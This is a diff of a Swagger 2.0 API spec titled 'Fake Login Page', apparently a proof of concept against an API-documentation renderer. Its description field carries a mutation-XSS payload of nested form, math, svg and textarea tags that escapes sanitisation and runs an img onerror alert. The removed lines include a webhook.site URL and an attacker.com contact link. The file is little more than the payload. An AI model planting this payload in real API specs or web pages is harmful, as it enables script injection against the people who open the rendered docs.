@@ -1,16 +1,7 @@
 swagger: '2.0'
 info:
-  version: 1.0.0
   title: Fake Login Page
   
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
-  servers:
-  - url: http://api.example.com/v1
-    description: Optional server description, e.g. Main (production) server  
-  termsOfService: |
-    https://webhook.site/ac5a1a22-d382-4277-917e-257cf18c8428
-  contact:
-    name: "API Support"
-    url: "https://attacker.com/"
-    email: "bilalabbasuk@gmail.com"
+  
